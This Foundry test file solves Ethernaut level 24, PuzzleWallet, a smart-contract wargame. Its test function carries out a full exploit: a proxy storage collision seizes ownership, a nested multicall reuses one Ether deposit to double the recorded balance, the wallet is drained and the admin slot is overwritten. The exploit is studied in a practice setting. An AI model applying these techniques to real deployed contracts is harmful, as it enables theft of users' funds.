//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../core/Ethernaut.sol';
import '../levels/24-PuzzleWallet/PuzzleWalletFactory.sol';

contract PuzzleWalletTest is DSTest {
  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  bytes[] depositData = [abi.encodeWithSignature('deposit()')];
  bytes[] multicallData = [
    abi.encodeWithSignature('deposit()'),
    abi.encodeWithSignature('multicall(bytes[])', depositData)
  ];

  function setUp() public {
    // Setup instance of the Ethernaut contract
    ethernaut = new Ethernaut();
    vm.deal(attacker, 101 ether);
  }

  function min(uint256 a, uint256 b) internal pure returns (uint256) {
    return a <= b ? a : b;
  }

  function testPuzzleWalletHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------

    PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
    ethernaut.registerLevel(puzzleWalletFactory);
    vm.startPrank(attacker);
    address levelAddress = ethernaut.createLevelInstance{ value: 0.001 ether }(
      puzzleWalletFactory
    );

    PuzzleProxy puzzleProxy = PuzzleProxy(payable(levelAddress));
    PuzzleWallet puzzleWallet = PuzzleWallet(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    // 1. Propose attacker as the new Proxy admin to become owner
    //    (because of shared state between Proxy <> Wallet)
    //              Proxy          Wallet
    //    Slot 0: pendingAdmin   |  owner
    //    Slot 1: admin          |  maxBalance
    puzzleProxy.proposeNewAdmin(attacker);
    assertEq(puzzleWallet.owner(), attacker);

    // 2. Add our wallet in the whitelist (onlyOwner is now OK)
    puzzleWallet.addToWhitelist(attacker);
    assert(puzzleWallet.whitelisted(attacker) == true);

    uint256 amount = 1 ether;
    // 3. Proceed to deposit Ether using multicall
    puzzleWallet.multicall{ value: amount }(multicallData);

    // The Wallet contract should have 1 Ether from our deposit
    // plus the amount during contract creatrion
    assertEq(address(puzzleWallet).balance, 1.001 ether);

    // Re-entering with multicall should trick the Wallet
    // into doubling the attacker's allowance
    assertEq(puzzleWallet.balances(attacker), 2 * amount);

    // 4. Empty wallet funds
    puzzleWallet.execute(attacker, address(puzzleWallet).balance, '');
    assertEq(address(puzzleWallet).balance, 0);

    // 5. Make ourselves admin
    puzzleWallet.setMaxBalance(uint256(uint160(attacker)));

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------

    bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(levelSuccessfullyPassed);
  }
}
